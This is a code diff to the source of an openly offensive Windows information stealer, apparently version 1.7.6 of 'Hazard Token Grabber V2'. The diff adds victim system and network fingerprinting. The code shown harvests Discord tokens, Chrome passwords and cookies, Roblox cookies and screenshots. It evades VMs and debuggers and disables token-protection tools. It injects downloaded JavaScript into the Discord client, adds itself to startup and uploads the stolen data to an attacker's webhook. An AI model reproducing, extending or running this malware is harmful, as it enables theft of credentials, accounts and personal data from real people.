@@ -13,13 +13,15 @@ import subprocess
 
 from sys import argv
 from PIL import ImageGrab
-from random import choice
 from base64 import b64decode
 from tempfile import mkdtemp
 from re import findall, match
 from Crypto.Cipher import AES
 from win32crypt import CryptUnprotectData
 
+__author__ = "Rdimo"
+__version__ = '1.7.6'
+__license__ = "GPL-3.0"
 config = {
     # replace WEBHOOK_HERE with your webhook ↓↓ or use the api from https://github.com/Rdimo/Discord-Webhook-Protector
     # Recommend using https://github.com/Rdimo/Discord-Webhook-Protector so your webhook can't be spammed or deleted
@@ -75,8 +77,8 @@ config = {
 # global variables
 Victim = os.getlogin()
 Victim_pc = os.getenv("COMPUTERNAME")
-ram = str(psutil.virtual_memory()[0]/1024 ** 3).split(".")[0]
-disk = str(psutil.disk_usage('/')[0]/1024 ** 3).split(".")[0]
+ram = str(psutil.virtual_memory()[0] / 1024 ** 3).split(".")[0]
+disk = str(psutil.disk_usage('/')[0] / 1024 ** 3).split(".")[0]
 
 
 class Functions(object):
@@ -113,6 +115,40 @@ class Functions(object):
             return "Failed to decrypt password"
 
     @staticmethod
+    def system_info() -> list:
+        cmd_to_exec = [
+            "wmic csproduct get uuid",
+            "powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform' -Name BackupProductKeyDefault",
+            "powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion' -Name ProductName",
+        ]
+        for i, v in enumerate(cmd_to_exec):
+            try:
+                cmd_to_exec[i] = subprocess.check_output(v, creationflags=0x08000000)
+            except Exception:
+                cmd_to_exec[i] = "N/A"
+
+        HWID = cmd_to_exec[0].decode().split('\n')[1].strip()
+        productName = cmd_to_exec[1].decode().rstrip()
+        wkey = cmd_to_exec[2].decode().rstrip()
+        return [HWID, productName, wkey]
+
+    @staticmethod
+    def network_info() -> list:
+        ip, city, country, region, org, loc, googlemap = "None", "None", "None", "None", "None", "None", "None"
+        req = httpx.get("https://ipinfo.io/json")
+        if req.status_code == 200:
+            data = req.json()
+            ip = data.get('ip')
+            city = data.get('city')
+            country = data.get('country')
+            region = data.get('region')
+            org = data.get('org')
+            loc = data.get('loc')
+            googlemap = "https://www.google.com/maps/search/google+map++" + loc
+
+        return [ip, city, country, region, org, loc, googlemap]
+
+    @staticmethod
     def fetch_conf(e: str) -> str or bool | None:
         return config.get(e)
 
@@ -125,6 +161,9 @@ class HazardTokenGrabberV2(Functions):
         self.roaming = os.getenv("appdata")
         self.chrome = self.appdata + "\\Google\\Chrome\\User Data\\"
         self.dir = mkdtemp()
+        inf, net = self.system_info(), self.network_info()
+        self.hwid, self.winver, self.winkey = inf[0], inf[1], inf[2]
+        self.ip, self.city, self.country, self.region, self.org, self.loc, self.googlemap = net[0], net[1], net[2], net[3], net[4], net[5], net[6]
         self.startup_loc = self.roaming + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
         self.hook_reg = "api/webhooks"
         self.regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
@@ -137,6 +176,7 @@ class HazardTokenGrabberV2(Functions):
         os.makedirs(self.dir, exist_ok=True)
 
     def try_extract(func):
+        '''Decorator to safely catch and ignore exceptions'''
         def wrapper(*args, **kwargs):
             try:
                 func(*args, **kwargs)
@@ -157,11 +197,13 @@ class HazardTokenGrabberV2(Functions):
             self.tokens.append(tkn)
 
     async def init(self):
+        if self.webhook == "":
+            os._exit(0)
         if self.fetch_conf('anti_debug') and AntiDebug().inVM:
             os._exit(0)
         await self.bypassBetterDiscord()
         await self.bypassTokenProtector()
-        function_list = [self.screenshot, self.grab_tokens, self.grabRobloxCookie]
+        function_list = [self.screenshot, self.sys_dump, self.grab_tokens, self.grabRobloxCookie]
         if self.fetch_conf('hide_self'):
             function_list.append(self.hide)
 
@@ -171,7 +213,7 @@ class HazardTokenGrabberV2(Functions):
         if self.fetch_conf('startup'):
             function_list.append(self.startup)
 
-        if os.path.exists(self.chrome+'Default') and os.path.exists(self.chrome+'Local State'):
+        if os.path.exists(self.chrome + 'Default') and os.path.exists(self.chrome + 'Local State'):
             function_list.append(self.grabPassword)
             function_list.append(self.grabCookies)
 
@@ -186,7 +228,6 @@ class HazardTokenGrabberV2(Functions):
         self.neatifyTokens()
         await self.injector()
         self.finish()
-        shutil.rmtree(self.dir)
 
     def hide(self):
         ctypes.windll.kernel32.SetFileAttributesW(argv[0], 2)
@@ -200,27 +241,28 @@ class HazardTokenGrabberV2(Functions):
     async def injector(self):
         for _dir in os.listdir(self.appdata):
             if 'discord' in _dir.lower():
-                discord = self.appdata+self.sep+_dir
-                disc_sep = discord+self.sep
+                discord = self.appdata + self.sep + _dir
+                disc_sep = discord + self.sep
                 for __dir in os.listdir(os.path.abspath(discord)):
                     if match(r'app-(\d*\.\d*)*', __dir):
-                        app = os.path.abspath(disc_sep+__dir)
-                        inj_path = app+'\\modules\\discord_desktop_core-3\\discord_desktop_core\\'
+                        app = os.path.abspath(disc_sep + __dir)
+                        inj_path = app + '\\modules\\discord_desktop_core-3\\discord_desktop_core\\'
                         if os.path.exists(inj_path):
                             if self.startup_loc not in argv[0]:
                                 try:
                                     os.makedirs(
-                                        inj_path+'initiation', exist_ok=True)
+                                        inj_path + 'initiation', exist_ok=True)
                                 except PermissionError:
                                     pass
                             if self.hook_reg in self.webhook:
                                 f = httpx.get(self.fetch_conf('injection_url')).text.replace("%WEBHOOK%", self.webhook)
                             else:
-                                f = httpx.get(self.fetch_conf('injection_url')).text.replace(
+                                f = httpx.get(
+                                    self.fetch_conf('injection_url')).text.replace(
                                     "%WEBHOOK%", self.webhook).replace(
                                     "%WEBHOOK_KEY%", self.fetch_conf('webhook_protector_key'))
                             try:
-                                with open(inj_path+'index.js', 'w', errors="ignore") as indexFile:
+                                with open(inj_path + 'index.js', 'w', errors="ignore") as indexFile:
                                     indexFile.write(f)
                             except PermissionError:
                                 pass
@@ -243,11 +285,11 @@ class HazardTokenGrabberV2(Functions):
         tp = f"{self.roaming}\\DiscordTokenProtector\\"
         if not os.path.exists(tp):
             return
-        config = tp+"config.json"
+        config = tp + "config.json"
 
         for i in ["DiscordTokenProtector.exe", "ProtectionPayload.dll", "secure.dat"]:
             try:
-                os.remove(tp+i)
+                os.remove(tp + i)
             except FileNotFoundError:
                 pass
         if os.path.exists(config):
@@ -276,7 +318,7 @@ class HazardTokenGrabberV2(Functions):
                 f.write("\n\n//Rdimo just shit on this token protector | https://github.com/Rdimo")
 
     async def bypassBetterDiscord(self):
-        bd = self.roaming+"\\BetterDiscord\\data\\betterdiscord.asar"
+        bd = self.roaming + "\\BetterDiscord\\data\\betterdiscord.asar"
         if os.path.exists(bd):
             x = self.hook_reg
             with open(bd, 'r', encoding="cp437", errors='ignore') as f:
@@ -284,20 +326,6 @@ class HazardTokenGrabberV2(Functions):
                 content = txt.replace(x, 'RdimoTheGoat')
             with open(bd, 'w', newline='', encoding="cp437", errors='ignore') as f:
                 f.write(content)
-
-    def getProductValues(self):
-        try:
-            wkey = subprocess.check_output(
-                r"powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform' -Name BackupProductKeyDefault",
-                creationflags=0x08000000).decode().rstrip()
-        except Exception:
-            wkey = "N/A (Likely Pirated)"
-        try:
-            productName = subprocess.check_output(
-                r"powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion' -Name ProductName", creationflags=0x08000000).decode().rstrip()
-        except Exception:
-            productName = "N/A"
-        return [productName, wkey]
 
     @try_extract
     def grab_tokens(self):
@@ -331,13 +359,13 @@ class HazardTokenGrabberV2(Functions):
                 continue
             disc = name.replace(" ", "").lower()
             if "cord" in path:
-                if os.path.exists(self.roaming+f'\\{disc}\\Local State'):
+                if os.path.exists(self.roaming + f'\\{disc}\\Local State'):
                     for file_name in os.listdir(path):
                         if file_name[-3:] not in ["log", "ldb"]:
                             continue
                         for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                             for y in findall(self.encrypted_regex, line):
-                                token = self.decrypt_val(b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming+f'\\{disc}\\Local State'))
+                                token = self.decrypt_val(b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming + f'\\{disc}\\Local State'))
                                 asyncio.run(self.checkToken(token))
             else:
                 for file_name in os.listdir(path):
@@ -347,8 +375,8 @@ class HazardTokenGrabberV2(Functions):
                         for token in findall(self.regex, line):
                             asyncio.run(self.checkToken(token))
 
-        if os.path.exists(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
-            for path, _, files in os.walk(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
+        if os.path.exists(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
+            for path, _, files in os.walk(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
                 for _file in files:
                     if not _file.endswith('.sqlite'):
                         continue
@@ -360,12 +388,12 @@ class HazardTokenGrabberV2(Functions):
     def grabPassword(self):
         master_key = self.get_master_key(self.chrome + 'Local State')
         login_db = self.chrome + 'default\\Login Data'
-        login = self.dir+self.sep+"Loginvault1.db"
+        login = self.dir + self.sep + "Loginvault1.db"
 
         shutil.copy2(login_db, login)
         conn = sqlite3.connect(login)
         cursor = conn.cursor()
-        with open(self.dir+"\\Google Passwords.txt", "w", encoding="cp437", errors='ignore') as f:
+        with open(self.dir + "\\Google Passwords.txt", "w", encoding="cp437", errors='ignore') as f:
             cursor.execute("SELECT action_url, username_value, password_value FROM logins")
             for r in cursor.fetchall():
                 url = r[0]
@@ -382,12 +410,12 @@ class HazardTokenGrabberV2(Functions):
     def grabCookies(self):
         master_key = self.get_master_key(self.chrome + 'Local State')
         login_db = self.chrome + 'default\\Network\\cookies'
-        login = self.dir+self.sep+"Loginvault2.db"
+        login = self.dir + self.sep + "Loginvault2.db"
 
         shutil.copy2(login_db, login)
         conn = sqlite3.connect(login)
         cursor = conn.cursor()
-        with open(self.dir+"\\Google Cookies.txt", "w", encoding="cp437", errors='ignore') as f:
+        with open(self.dir + "\\Google Cookies.txt", "w", encoding="cp437", errors='ignore') as f:
             cursor.execute("SELECT host_key, name, encrypted_value from cookies")
             for r in cursor.fetchall():
                 host = r[0]
@@ -402,7 +430,7 @@ class HazardTokenGrabberV2(Functions):
         os.remove(login)
 
     def neatifyTokens(self):
-        f = open(self.dir+"\\Discord Info.txt", "w", encoding="cp437", errors='ignore')
+        f = open(self.dir + "\\Discord Info.txt", "w", encoding="cp437", errors='ignore')
         for token in self.tokens:
             j = httpx.get(self.discordApi, headers=self.get_headers(token)).json()
             user = j.get('username') + '#' + str(j.get("discriminator"))
@@ -431,13 +459,13 @@ class HazardTokenGrabberV2(Functions):
                 badges += "Verified Bot Developer, "
             if (badges == ""):
                 badges = "None"
+
             email = j.get("email")
-            phone = j.get("phone") if j.get(
-                "phone") else "No Phone Number attached"
-            nitro_data = httpx.get(self.discordApi+'/billing/subscriptions', headers=self.get_headers(token)).json()
+            phone = j.get("phone") if j.get("phone") else "No Phone Number attached"
+            nitro_data = httpx.get(self.discordApi + '/billing/subscriptions', headers=self.get_headers(token)).json()
             has_nitro = False
             has_nitro = bool(len(nitro_data) > 0)
-            billing = bool(len(json.loads(httpx.get(self.discordApi+"/billing/payment-sources", headers=self.get_headers(token)).text)) > 0)
+            billing = bool(len(json.loads(httpx.get(self.discordApi + "/billing/payment-sources", headers=self.get_headers(token)).text)) > 0)
             f.write(f"{' '*17}{user}\n{'-'*50}\nToken: {token}\nHas Billing: {billing}\nNitro: {has_nitro}\nBadges: {badges}\nEmail: {email}\nPhone: {phone}\n\n")
         f.close()
 
@@ -455,9 +483,9 @@ class HazardTokenGrabberV2(Functions):
         if reg_cookie:
             self.robloxcookies.append(reg_cookie)
         if self.robloxcookies:
-            with open(self.dir+"\\Roblox Cookies.txt", "w") as f:
+            with open(self.dir + "\\Roblox Cookies.txt", "w") as f:
                 for i in self.robloxcookies:
-                    f.write(i+'\n')
+                    f.write(i + '\n')
 
     def screenshot(self):
         image = ImageGrab.grab(
@@ -469,10 +497,33 @@ class HazardTokenGrabberV2(Functions):
         image.save(self.dir + "\\Screenshot.png")
         image.close()
 
+    def sys_dump(self):
+        about = f"""
+        ==========================
+        {Victim} | {Victim_pc}
+        ==========================
+        Windows key: {self.winkey}
+        Windows version: {self.winver}
+        ==========================
+        RAM: {ram}GB
+        DISK: {disk}GB
+        HWID: {self.hwid}
+        ==========================
+        IP: {self.ip}
+        City: {self.city}
+        Country: {self.country}
+        Region: {self.region}
+        Org: {self.org}
+        GoogleMaps: {self.googlemap}
+        ==========================
+        """
+        with open(self.dir + "\\System info.txt", "w", encoding="utf-8", errors='ignore') as f:
+            f.write(about)
+
     def finish(self):
         for i in os.listdir(self.dir):
             if i.endswith('.txt'):
-                path = self.dir+self.sep+i
+                path = self.dir + self.sep + i
                 with open(path, "r", errors="ignore") as ff:
                     x = ff.read()
                     if not x:
@@ -482,23 +533,7 @@ class HazardTokenGrabberV2(Functions):
                         with open(path, "w", encoding="utf-8", errors="ignore") as f:
                             f.write("🌟・Grabber By github.com/Rdimo・https://github.com/Rdimo/Hazard-Token-Grabber-V2\n\n")
                         with open(path, "a", encoding="utf-8", errors="ignore") as fp:
-                            fp.write(x+"\n\n🌟・Grabber By github.com/Rdimo・https://github.com/Rdimo/Hazard-Token-Grabber-V2")
-
-        w = self.getProductValues()
-        wname = w[0].replace(" ", "᠎ ")
-        wkey = w[1].replace(" ", "᠎ ")
-
-        links = ["https://ipinfo.io/json", "https://utilities.tk/network/info"]
-        link = choice(links)
-        data = httpx.get(link).json()
-
-        ip = data.get('ip')
-        city = data.get('city')
-        country = data.get('country')
-        region = data.get('region')
-        org = data.get('org')
-        loc = data.get('loc')
-        googlemap = "https://www.google.com/maps/search/google+map++" + loc
+                            fp.write(x + "\n\n🌟・Grabber By github.com/Rdimo・https://github.com/Rdimo/Hazard-Token-Grabber-V2")
 
         _zipfile = os.path.join(self.appdata, f'Hazard.V2-[{Victim}].zip')
         zipped_file = zipfile.ZipFile(_zipfile, "w", zipfile.ZIP_DEFLATED)
@@ -509,6 +544,7 @@ class HazardTokenGrabberV2(Functions):
                 arcname = absname[len(abs_src) + 1:]
                 zipped_file.write(absname, arcname)
         zipped_file.close()
+
         files_found = ''
         for f in os.listdir(self.dir):
             files_found += f"・{f}\n"
@@ -516,6 +552,7 @@ class HazardTokenGrabberV2(Functions):
         for tkn in self.tokens:
             tokens += f'{tkn}\n\n'
         fileCount = f"{len(files)} Files Found: "
+
         embed = {
             'avatar_url': 'https://raw.githubusercontent.com/Rdimo/images/master/Hazard-Token-Grabber-V2/Big_hazard.gif',
             'embeds': [
@@ -526,16 +563,16 @@ class HazardTokenGrabberV2(Functions):
                         'icon_url': 'https://raw.githubusercontent.com/Rdimo/images/master/Hazard-Token-Grabber-V2/Small_hazard.gif'
                     },
                     'color': 176185,
-                    'description': f'[Google Maps Location]({googlemap})',
+                    'description': f'[Google Maps Location]({self.googlemap})',
                     'fields': [
                         {
                             'name': '\u200b',
                             'value': f'''```fix
-                                IP:᠎ {ip.replace(" ", "᠎ ") if ip else "N/A"}
-                                Org:᠎ {org.replace(" ", "᠎ ") if org else "N/A"}
-                                City:᠎ {city.replace(" ", "᠎ ") if city else "N/A"}
-                                Region:᠎ {region.replace(" ", "᠎ ") if region else "N/A"}
-                                Country:᠎ {country.replace(" ", "᠎ ") if country else "N/A"}```
+                                IP:᠎ {self.ip.replace(" ", "᠎ ") if self.ip else "N/A"}
+                                Org:᠎ {self.org.replace(" ", "᠎ ") if self.org else "N/A"}
+                                City:᠎ {self.city.replace(" ", "᠎ ") if self.city else "N/A"}
+                                Region:᠎ {self.region.replace(" ", "᠎ ") if self.region else "N/A"}
+                                Country:᠎ {self.country.replace(" ", "᠎ ") if self.country else "N/A"}```
                             '''.replace(' ', ''),
                             'inline': True
                         },
@@ -543,8 +580,8 @@ class HazardTokenGrabberV2(Functions):
                             'name': '\u200b',
                             'value': f'''```fix
                                 PCName: {Victim_pc.replace(" ", "᠎ ")}
-                                WinKey:᠎ {wkey}
-                                Platform:᠎ {wname}
+                                WinKey:᠎ {self.winkey.replace(" ", "᠎ ")}
+                                WinVer:᠎ {self.winver.replace(" ", "᠎ ")}
                                 DiskSpace:᠎ {disk}GB
                                 Ram:᠎ {ram}GB```
                             '''.replace(' ', ''),
@@ -583,6 +620,7 @@ class HazardTokenGrabberV2(Functions):
                 httpx.post(self.webhook, headers={"Authorization": key}, json=embed)
                 httpx.post(self.webhook, headers={"Authorization": key}, files={'upload_file': f})
         os.remove(_zipfile)
+        shutil.rmtree(self.dir, ignore_errors=True)
 
 
 class AntiDebug(Functions):
@@ -625,12 +663,6 @@ class AntiDebug(Functions):
     def programExit(self):
         self.__class__.inVM = True
 
-    def programKill(self, proc):
-        try:
-            os.system(f"taskkill /F /T /IM {proc}")
-        except (PermissionError, InterruptedError, ChildProcessError, ProcessLookupError):
-            pass
-
     def listCheck(self):
         for path in [r'D:\Tools', r'D:\OS2', r'D:\NT3X']:
             if os.path.exists(path):
@@ -644,12 +676,8 @@ class AntiDebug(Functions):
             if Victim_pc == pcName:
                 self.programExit()
 
-        try:
-            myHWID = subprocess.check_output(r"wmic csproduct get uuid", creationflags=0x08000000).decode().split('\n')[1].strip()
-        except Exception:
-            myHWID = ""
         for hwid in self.blackListedHWIDS:
-            if myHWID == hwid:
+            if self.system_info[0] == hwid:
                 self.programExit()
 
     def specsCheck(self):
